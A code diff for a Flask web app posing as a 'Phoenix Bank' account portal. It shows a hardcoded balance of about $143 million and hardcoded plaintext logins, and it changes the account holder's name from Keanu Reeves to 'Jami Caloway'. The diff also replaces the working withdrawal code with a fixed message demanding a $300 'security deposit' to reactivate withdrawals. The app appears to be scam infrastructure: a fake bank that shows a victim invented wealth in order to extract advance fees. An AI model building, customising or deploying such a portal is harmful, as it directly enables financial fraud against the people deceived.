@@ -23,13 +23,13 @@ class User(UserMixin):
 
 # Updated User Data
 users = {
-    'richard': User('richard', 'Richard Smith', 'richard27@'),
+    'jami': User('jami', 'Jami Caloway', 'jami2026@'),
     'richard': User('richard', 'Richard Admin', 'admin2026')
 }
 
 # Updated User Roles
 user_roles = {
-    "keanu": "user",
+    "jami": "user",
     "richard": "admin"
 }
 
@@ -61,7 +61,7 @@ MANUAL_BALANCE = 143787523.00
 account_data = {
     'bank_name': 'Phoenix Bank',
     'bank_tagline': 'Advanced Elite Banking Service',
-    'name': 'Keanu Reeves',  # Updated Name
+    'name': 'Jami Caloway',
     'header': 'ACCOUNT STATEMENT – PREMIUM ACTIVITY SUMMARY',
     'balance': MANUAL_BALANCE,
     'formatted_balance': format_balance(MANUAL_BALANCE),
@@ -225,7 +225,7 @@ def chat_feed():
 @login_required
 def card_details():
     card_info = {
-        "holder": "Keanu Reeves", # Updated Name
+        "holder": "Jami Caloway",
         "card_type": "Mastercard",
         "card_number": "**** **** **** 9659",
         "expiry": "06 / 29",
@@ -242,28 +242,7 @@ def card_details():
 def withdraw():
     message = ''
     if request.method == 'POST':
-        try:
-            amount = float(request.form['amount'])
-            if amount <= 0:
-                message = 'Withdrawal must be greater than zero.'
-            elif amount > account_data['balance']:
-                message = 'Insufficient funds.'
-            else:
-                new_txn = {
-                    'id': str(uuid.uuid4()),
-                    'date': datetime.now().strftime("%Y-%m-%d"),
-                    'type': 'Withdrawal',
-                    'category': 'Wire Transfer',
-                    'amount': -amount,
-                    'note': 'Manual Withdrawal',
-                    'description': 'User initiated withdrawal'
-                }
-                account_data['transactions'].append(new_txn)
-                account_data['transactions'] = sort_transactions(account_data['transactions'])
-                account_data['transactions'] = add_running_balance(account_data['transactions'])
-                message = f'Successfully processed withdrawal request of ${amount:,.2f}'
-        except ValueError:
-            message = 'Invalid number format.'
+        message = 'Withdrawal paused over inability for over 30 days. A $300 security deposit is required to reactivate withdrawal.'
     return render_template('withdraw.html', account=account_data, message=message)
 
 @app.route("/support/chat")
